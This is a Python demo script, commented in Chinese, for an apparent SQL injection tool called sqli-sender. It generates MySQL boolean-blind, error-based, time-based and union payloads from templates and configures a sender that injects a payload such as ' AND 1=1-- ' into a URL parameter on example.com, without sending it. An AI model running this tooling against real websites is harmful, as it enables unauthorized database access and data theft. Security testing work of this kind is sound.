#!/usr/bin/env python
"""sqli-sender 使用示例。"""

import logging
import os

from sqli_sender import InjectionSender, PayloadProcessor

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)


def demo_payload_processor():
    """演示 PayloadProcessor 的用法。"""
    print("=" * 60)
    print("PayloadProcessor 使用示例")
    print("=" * 60)

    processor = PayloadProcessor()

    # 加载内置默认模板
    default_path = os.path.join(
        os.path.dirname(__file__),
        "sqli_sender",
        "payloads",
        "default.yaml",
    )
    processor.load_from_file(default_path)

    print(f"\n支持的数据库类型: {processor.get_supported_databases()}")
    print(
        f"MySQL 支持的注入方式: "
        f"{processor.get_supported_injection_types('mysql')}"
    )

    # 生成布尔盲注 payload
    print("\n--- MySQL 布尔盲注 ---")
    payloads = processor.get_payloads(
        "mysql", "boolean_based", boolean_condition="1=1"
    )
    for p in payloads:
        print(f"  {p}")

    # 生成报错注入 payload
    print("\n--- MySQL 报错注入 ---")
    payloads = processor.get_payloads(
        "mysql", "error_based", query="SELECT user()"
    )
    for p in payloads:
        print(f"  {p}")

    # 生成时间盲注 payload
    print("\n--- MySQL 时间盲注 ---")
    payloads = processor.get_payloads(
        "mysql", "time_based", boolean_condition="1=1", sleep_time="5"
    )
    for p in payloads:
        print(f"  {p}")

    # 生成联合查询 payload
    print("\n--- MySQL 联合查询 ---")
    payloads = processor.get_payloads(
        "mysql", "union_based", columns="1,2,3"
    )
    for p in payloads:
        print(f"  {p}")


def demo_injection_sender():
    """演示 InjectionSender 的用法。"""
    print("=" * 60)
    print("InjectionSender 使用示例")
    print("=" * 60)

    # 基本配置：在 URL 参数 id 中注入 payload
    sender = InjectionSender(
        url="http://example.com/page.php",
        method="GET",
        params={"id": "1{{PAYLOAD}}"},
        headers={"User-Agent": "sqli-sender/0.1.0"},
        injection_point="param",
        injection_type="boolean",
        timeout=10,
    )

    print(f"\n发送器配置: {sender}")

    # 构造要发送的 payload
    payload = " AND 1=1-- "
    print(f"发送 payload: {payload}")
    print("(请求不会实际发出，因 example.com 为保留域名)")
    print(f"  如果发送，URL 将为: {sender.url}")
    print(f"  替换后 params 将为: {{'id': '1{payload}'}}")


def demo_custom_yaml():
    """演示加载自定义 YAML 模板文件。"""
    print("=" * 60)
    print("自定义 YAML 模板示例")
    print("=" * 60)

    import tempfile
    import yaml

    custom_template = {
        "databases": {
            "mysql": {
                "comment": "-- ",
                "boolean_based": [
                    "AND CUSTOM_FN({BOOLEAN_CONDITION})",
                ],
            }
        }
    }

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".yaml", delete=False
    ) as f:
        yaml.dump(custom_template, f)
        custom_path = f.name

    try:
        processor = PayloadProcessor()
        processor.load_from_file(custom_path)
        payloads = processor.get_payloads(
            "mysql", "boolean_based", boolean_condition="1=2"
        )
        print(f"\n自定义模板载荷: {payloads}")
    finally:
        os.unlink(custom_path)


def main():
    demo_payload_processor()
    print()
    demo_injection_sender()
    print()
    demo_custom_yaml()
    print("\n演示完成。")


if __name__ == "__main__":
    main()
